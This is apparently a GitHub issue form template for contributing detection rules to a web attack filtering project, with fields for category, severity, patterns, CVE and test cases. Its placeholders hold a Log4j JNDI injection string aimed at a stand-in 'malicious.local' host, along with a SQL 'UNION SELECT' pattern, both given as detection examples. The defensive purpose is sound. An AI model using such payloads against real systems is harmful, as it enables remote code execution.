name: Submit Community Rule
description: Submit a new detection rule to the community
title: "[Rule] "
labels: ["community", "new-rule"]
body:
  - type: markdown
    attributes:
      value: |
        Thanks for contributing a community rule! Please fill out this template.

  - type: input
    id: rule-name
    attributes:
      label: Rule Name
      placeholder: "e.g., Log4j CVE-2021-44228 Detection"
    validations:
      required: true

  - type: dropdown
    id: category
    attributes:
      label: Attack Category
      options:
        - SQL Injection (sqli)
        - Cross-Site Scripting (xss)
        - Remote Code Execution (rce)
        - Local File Inclusion (lfi)
        - Remote File Inclusion (rfi)
        - Path Traversal
        - XXE Injection
        - Scanner/Crawler Detection
        - Other
    validations:
      required: true

  - type: dropdown
    id: severity
    attributes:
      label: Severity Level
      options:
        - Critical (4) - Auto-block recommended
        - High (3) - Block on medium-high sensitivity
        - Medium (2) - Block on high sensitivity
        - Low (1) - Logging only
    validations:
      required: true

  - type: textarea
    id: description
    attributes:
      label: Description
      description: What does this rule detect?
      placeholder: |
        Describe the attack pattern this rule detects.
        Include CVE numbers if applicable.
    validations:
      required: true

  - type: textarea
    id: patterns
    attributes:
      label: Detection Patterns
      description: What patterns does this rule match?
      placeholder: |
        List the regex patterns or literals this rule detects.
        Example:
        - ${jndi:ldap:// (JNDI LDAP lookup)
        - UNION SELECT (SQL UNION injection)
    validations:
      required: true

  - type: input
    id: cve
    attributes:
      label: CVE Number (if applicable)
      placeholder: "e.g., CVE-2021-44228"

  - type: textarea
    id: test-cases
    attributes:
      label: Test Cases
      description: Include positive and negative test cases
      placeholder: |
        ## Should Match
        - Input: "${jndi:ldap://malicious.local/a}"
        
        ## Should NOT Match
        - Input: "Normal text without patterns"

  - type: textarea
    id: references
    attributes:
      label: References
      description: Links to vulnerability details, blog posts, etc.
      placeholder: |
        - https://nvd.nist.gov/vuln/detail/CVE-XXXX-XXXX
        - https://kuro-toji.local/security-advisory